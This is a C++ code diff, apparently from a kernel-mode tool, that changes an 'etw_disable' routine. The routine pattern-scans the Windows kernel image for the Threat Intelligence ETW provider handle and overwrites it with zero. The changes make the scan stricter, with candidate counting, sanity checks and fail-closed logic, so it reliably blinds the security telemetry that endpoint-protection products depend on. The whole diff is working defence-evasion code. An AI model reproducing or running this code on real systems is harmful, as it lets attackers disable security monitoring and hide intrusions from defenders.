@@ -191,6 +191,26 @@ namespace etw_disable {
         return false;
     }
 
+    __forceinline bool provider_handle_target_is_sane(PVOID nt_base, PVOID handle, UINT64* current_value) {
+        if (current_value)
+            *current_value = 0;
+        if (!handle || (reinterpret_cast<ULONG_PTR>(handle) & (sizeof(UINT64) - 1)) != 0)
+            return false;
+        if (!nt_section_contains(nt_base, handle, sizeof(UINT64), IMAGE_SCN_MEM_WRITE))
+            return false;
+
+        __try {
+            UINT64 value = *static_cast<volatile UINT64*>(handle);
+            if (current_value)
+                *current_value = value;
+            if (value != 0 && value < 0xFFFF800000000000ULL)
+                return false;
+            return true;
+        } __except (EXCEPTION_EXECUTE_HANDLER) {
+            return false;
+        }
+    }
+
 
     __forceinline bool safe_write_memory(PVOID dest, const PVOID src, SIZE_T size) {
         LARGE_INTEGER freq = {};
@@ -307,41 +327,91 @@ namespace etw_disable {
             SN_LOG("etw_disable::find_and_disable windows11_path build=%lu",
                 nt_version::build_number());
 
+            PVOID selected_handle = nullptr;
+            PVOID selected_found = nullptr;
+            UINT64 selected_value = 0;
+            USHORT selected_section = 0;
+            ULONG raw_candidates = 0;
+            ULONG valid_candidates = 0;
+
             for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++) {
                 if (!(sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE))
                     continue;
 
                 PVOID section_base = static_cast<UCHAR*>(nt_base) + sections[i].VirtualAddress;
                 ULONG section_size = sections[i].Misc.VirtualSize;
-                PVOID found = find_pattern_safe(section_base, section_size, pat_win11, "xxx????xxxxxxxx", "win11_threatint_handle");
-                if (!found)
-                    continue;
+                ULONG search_offset = 0;
 
-                PVOID handle = resolve_relative(found, 3, 7);
-                bool valid = handle &&
-                    nt_section_contains(nt_base, handle, sizeof(UINT64), IMAGE_SCN_MEM_WRITE);
-                SN_LOG("etw_disable::find_and_disable windows11_candidate section=%u found=%p handle=%p valid=%u elapsed_us=%lu",
-                    i,
-                    found,
-                    handle,
-                    valid ? 1u : 0u,
-                    elapsed_us(begin, freq));
-                if (!valid)
-                    continue;
+                for (;;) {
+                    if (search_offset >= section_size)
+                        break;
 
-                g_provider_handle = handle;
-                UINT64 zero = 0;
-                bool write_ok = safe_write_memory(handle, &zero, sizeof(zero));
-                SN_LOG("etw_disable::find_and_disable windows11_write handle=%p ok=%u elapsed_us=%lu",
-                    handle,
-                    write_ok ? 1u : 0u,
-                    elapsed_us(begin, freq));
-                return write_ok;
+                    PVOID search_base = static_cast<UCHAR*>(section_base) + search_offset;
+                    ULONG remaining = section_size - search_offset;
+                    PVOID found = find_pattern_safe(search_base, remaining, pat_win11, "xxx????xxxxxxxx", "win11_threatint_handle");
+                    if (!found)
+                        break;
+
+                    raw_candidates++;
+                    PVOID handle = resolve_relative(found, 3, 7);
+                    UINT64 current_value = 0;
+                    bool valid = provider_handle_target_is_sane(nt_base, handle, &current_value);
+                    SN_LOG("etw_disable::find_and_disable windows11_candidate section=%u found=%p handle=%p valid=%u current=0x%llx raw=%lu valid_count=%lu elapsed_us=%lu",
+                        i,
+                        found,
+                        handle,
+                        valid ? 1u : 0u,
+                        static_cast<unsigned long long>(current_value),
+                        raw_candidates,
+                        valid_candidates + (valid ? 1u : 0u),
+                        elapsed_us(begin, freq));
+                    if (valid) {
+                        valid_candidates++;
+                        if (valid_candidates == 1) {
+                            selected_handle = handle;
+                            selected_found = found;
+                            selected_value = current_value;
+                            selected_section = i;
+                        }
+                    }
+
+                    ULONG consumed = static_cast<ULONG>(
+                        static_cast<UCHAR*>(found) - static_cast<UCHAR*>(section_base)) + 1;
+                    if (consumed <= search_offset || consumed >= section_size)
+                        break;
+                    search_offset = consumed;
+                }
             }
 
-            SN_LOG("etw_disable::find_and_disable windows11_no_verified_handle elapsed_us=%lu",
+            if (valid_candidates != 1 || !selected_handle) {
+                SN_LOG("etw_disable::find_and_disable windows11_fail_closed raw_candidates=%lu valid_candidates=%lu selected=%p elapsed_us=%lu",
+                    raw_candidates,
+                    valid_candidates,
+                    selected_handle,
+                    elapsed_us(begin, freq));
+                return false;
+            }
+
+            g_provider_handle = selected_handle;
+            if (selected_value == 0) {
+                SN_LOG("etw_disable::find_and_disable windows11_already_disabled section=%u found=%p handle=%p elapsed_us=%lu",
+                    selected_section,
+                    selected_found,
+                    selected_handle,
+                    elapsed_us(begin, freq));
+                return true;
+            }
+
+            UINT64 zero = 0;
+            bool write_ok = safe_write_memory(selected_handle, &zero, sizeof(zero));
+            SN_LOG("etw_disable::find_and_disable windows11_write section=%u found=%p handle=%p old=0x%llx ok=%u elapsed_us=%lu",
+                selected_section,
+                selected_found,
+                selected_handle,
+                static_cast<unsigned long long>(selected_value),
+                write_ok ? 1u : 0u,
                 elapsed_us(begin, freq));
-            return false;
+            return write_ok;
         }
 
         for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++) {
